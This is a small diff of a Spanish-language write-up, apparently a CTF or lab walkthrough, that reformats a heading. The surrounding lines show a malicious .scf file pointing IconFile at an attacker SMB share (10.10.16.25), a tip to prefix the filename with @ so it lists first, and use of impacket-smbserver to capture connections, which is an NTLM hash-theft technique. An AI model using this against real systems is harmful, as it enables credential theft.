@@ -161,7 +161,8 @@ IconFile=\\10.10.16.25\share\test.ico
 Command=ToggleDesktop
 ```
 
-¿Por qué ponemos el @ delante del nombre del archivo?:
+###### ¿Por qué ponemos el @ delante del nombre del archivo?
+
 Añadiendo este símbolo al comienzo del nombre, el archivo será colocado por encima del resto en el recurso compartido.
 
 Una vez creado el archivo, compartimos un recurso en red con ayuda de  **`impacket-smbserver`** y subimos el archivo **`.scf`** a la web.
